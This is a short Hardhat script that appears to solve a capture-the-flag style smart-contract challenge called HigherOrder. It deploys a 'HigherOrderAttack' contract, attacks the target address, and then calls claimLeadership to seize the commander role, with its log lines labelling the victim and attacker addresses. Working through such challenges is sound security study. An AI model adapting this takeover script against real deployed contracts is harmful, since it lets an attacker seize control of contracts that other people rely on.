import { ethers } from "hardhat";

async function main() {
  // Prepare the target and attacker addresses
  const target = "0xD1e14F5bDcD7Ba5bdA97075C04d20BC1b4A13Bf8";
  const [attacker] = await ethers.getSigners();

  // Log the addresses
  console.log("Victim address:", target);
  console.log("Attacker address:", attacker.address);

  // Get the HigherOrder contract instance
  const HigherOrder = await ethers.getContractAt(
    "HigherOrder",
    target,
    attacker,
  );

  // Get the HigherOrderAttack contract instance and deploy it
  const HigherOrderFactory = await ethers.getContractFactory(
    "HigherOrderAttack",
  );
  const HigherOrderAttack = await HigherOrderFactory.deploy();
  await HigherOrderAttack.deployed();

  // Log the current Commander in the High Order contract
  const currentCommander = await HigherOrder.commander();
  console.log("Current Commander:", currentCommander);

  console.log("Attacking...");

  // Attack the target contract
  let tx = await HigherOrderAttack.attack(target);
  await tx.wait();

  // Claim leadership in the High Order contract
  tx = await HigherOrder.claimLeadership();
  await tx.wait();

  // Log the new Commander in the High Order contract
  const newCommander = await HigherOrder.commander();
  console.log("New Commander:", newCommander);
}

main();
